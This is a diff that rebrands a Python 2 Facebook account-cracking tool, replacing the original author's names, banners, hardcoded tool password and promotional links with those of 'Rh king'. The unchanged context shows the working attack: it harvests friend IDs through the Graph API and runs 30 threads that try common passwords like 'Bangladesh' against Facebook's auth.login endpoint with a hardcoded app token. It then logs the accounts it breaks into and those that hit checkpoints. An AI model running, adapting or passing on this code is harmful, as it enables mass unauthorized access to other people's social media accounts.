@@ -1,8 +1,8 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To BabarAli
+#The Credit For This Code  Rh king bd
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
-#Reserved2020
+#Reserved2021
 
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
@@ -48,7 +48,7 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.01)
 
-#Dev:Babar_Ali
+#Dev:Rh king
 ##### LOGO #####
 logo = """
                  .88888888:.
@@ -80,14 +80,14 @@ logo = """
 
 ---------------------------------------------
 \033[1;96m|-------+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-----|
-\033[1;96m|               Pak Anonymous               |
+\033[1;96m|                Rh king               |
 \033[1;96m|This Tool is Only for Bangladesh FB Acounts|
 \033[1;96m|------+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+------|
 
-\033[1;91m [⚡\033[1;97mAuthor Name: Babar Ali     ⚡\033[1;91m]
-\033[1;91m [⚡\033[1;97mYutube Chnl: Pak Anonymous ⚡\033[1;91m]
-\033[1;91m [⚡       \033[1;97mFrom: Pakistan      ⚡\033[1;91m]
-\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHuntter\033[1;95m-_-_-_-_-_-_-_-_-»
+\033[1;91m [⚡\05[1;97mAuthor Name: Rh king     ⚡\05[1;91m]
+\033[1;91m [⚡\05[1;97mfb:cyber king squad ⚡\033[1;91m]
+\033[1;91m [⚡       \033[1;97mFrom: bangladash      ⚡\033[1;91m]
+\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mRh king\033[1;95m-_-_-_-_-_-_-_-_-»
 """
 
 def tik():
@@ -122,10 +122,10 @@ print  """
 \033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHuntter\033[1;95m-_-_-_-_-_-_-_-_-»
 \033[1;92mNote1: Enter Tool usernam and Password 
 \033[1;92mNote2: This Tool is only for Bangladesh
-\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHuntter\033[1;95m-_-_-_-_-_-_-_-_-»
+\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mRh king\033[1;95m-_-_-_-_-_-_-_-_-»
  """
-CorrectUsername = "Huntter"
-CorrectPassword = "Facebook"
+CorrectUsername = "Rh"
+CorrectPassword = "king"
 
 loop = 'true'
 while (loop == 'true'):
@@ -138,10 +138,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;93mWrong Password"
-            os.system('xdg-open https://.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+            os.system('xdg-open https://facebook.com/groups/410705233430512/')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+        os.system('xdg-open https://www.facebook.com/106457414408853')
 
 ##### LICENSE #####
 #=================#
@@ -259,14 +259,14 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;94mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:Babar_Ali
+	os.system("clear") #Dev:Rh king
 	print logo
 	print "  \033[1;92m\033[1;93m💫💫Logged in User Info\033[1;92m💫💫"
 	print "	   \033[1;91m Name\033[1;93m:\033[1;91m"+nama+"\033[1;93m               "
 	print "	   \033[1;91m ID\033[1;93m:\033[1;91m"+id+"\x1b[1;93m              "
 	print "\033[1;97m[1]\x1b[1;92mStart Hacking"
 	print "\033[1;97m[2]\x1b[1;92mID Not Found Problem"
-	print "\033[1;97m[3]\x1b[1;92mSubscribe Pak Anonymous Youtube Channel " 
+	print "\033[1;97m[3]\x1b[1;92m joien fb group cyber king sqaud " 
 	print "\033[1;97m[0]\033[1;93mExit            "
 	pilih()
 
@@ -282,7 +282,7 @@ def pilih():
 		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
 	        menu()
 	elif unikers =="3":
-		os.system('xdg-open https://m.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+		os.system('xdg-open https://www.facebook.com/106457414408853')
 	        menu()		
 	elif unikers =="0":
 		jalan('Token Removed')
@@ -302,7 +302,7 @@ def pilih():
 		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
 	        menu()
 	elif unikers =="3":
-		os.system('xdg-open https://m.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+		os.system('xdg-open https://www.facebook.com/106457414408853/posts/187081983013062')
                 menu()
 	elif unikers =="0":
 		jalan('Token Removed')
@@ -337,7 +337,7 @@ def pilih_super():
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
-		print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHuntter\033[1;95m-_-_-_-_-_-_-_-_-»"
+		print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91Rh king\033[1;95m-_-_-_-_-_-_-_-_-»"
 		print logo
 		jalan('\033[1;91mGetting Accounts \033[1;93m■■■■■100%')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
@@ -346,7 +346,7 @@ def pilih_super():
 			id.append(s['id'])
 	elif peak =="2":
 		os.system('clear')
-		print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHunttet\033[1;95m-_-_-_-_-_-_-_-_-»"
+		print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mRh king\033[1;95m-_-_-_-_-_-_-_-_-»"
 		print logo
 		idt = raw_input("\033[1;96m[*] \033[1;96mEnter ID\033[1;93m: \033[1;97m")
 		try:
@@ -374,7 +374,7 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;93m•Cloning Has Been Started•\033[1;93m"+o),;sys.stdout.flush();time.sleep(0.05)
 	print "\n\033[1;92mNOTE:\x1b[1;93m [If You Want to Stop Process Press CTRL+Z]"
-	print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHuntter\033[1;95m-_-_-_-_-_-_-_-_-»"
+	print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mRh king\033[1;95m-_-_-_-_-_-_-_-_-»"
  	
 			
 	def main(arg):
@@ -497,7 +497,7 @@ def pilih_super():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = 'Bangladesh'											
+							                           pass6 = ' Bangladesh'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
@@ -591,11 +591,11 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-#Dev:Babar_Ali
+#Dev:Rh king
         print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHuntter\033[1;95m-_-_-_-_-_-_-_-_-»"
 	print '\033[1;94m[Process Has Been Completed]'
 	print"\033[1;94mTotal\033[1;92mOK/\x1b[1;91mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
-	print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHuntter\033[1;95m-_-_-_-_-_-_-_-_-»"
+	print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mRh king\033[1;95m-_-_-_-_-_-_-_-_-»"
 	print """
              
           ^^         |         ^^
@@ -618,7 +618,7 @@ def pilih_super():
              ::             ::
              ^^             ^^
 
-print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHuntter\033[1;95m-_-_-_-_-_-_-_-_-»"
+print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mRh king\033[1;95m-_-_-_-_-_-_-_-_-»"
 	
 \033[1;94m██████╗░██╗░░░██╗███████╗
 \033[1;94m██╔══██╗╚██╗░██╔╝██╔════╝
@@ -627,7 +627,7 @@ print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHuntter\033[1;95m-_-_-_-_-_-_-_-_-
 \033[1;94m██████╦╝░░░██║░░░███████╗
 \033[1;94m╚═════╝░░░░╚═╝░░░╚══════╝
 """
-	print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHuntter\033[1;95m-_-_-_-_-_-_-_-_-»"
+	print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mRh king\033[1;95m-_-_-_-_-_-_-_-_-»"
 	raw_input("\n\033[1;97m[\033[1;95mBack\033[1;97m]")
 	menu()
 
